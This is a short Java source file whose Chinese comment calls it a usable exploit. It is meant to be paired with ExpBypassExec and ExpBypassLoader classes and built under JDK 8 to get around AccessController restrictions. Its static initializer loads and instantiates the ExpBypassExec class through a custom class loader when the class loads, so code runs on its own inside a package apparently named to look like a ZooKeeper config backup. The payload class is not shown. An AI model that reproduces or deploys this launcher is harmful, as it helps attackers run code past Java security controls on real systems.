/*
可使用的exp：需要与ExpBypassExec/ExpBypassLoader合用，需要在JDK 8下编译（因为AccessController在jdk17中废弃了）
*/
package zk_backup_0.configs.conf1;

public class ExpBypassMain {
    static {
        ExpBypassLoader loader = new ExpBypassLoader();

        try {
            Class<?> clz = Class.forName("zk_backup_0.configs.conf1.ExpBypassExec", true, loader);
            Object object = clz.newInstance();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }
}
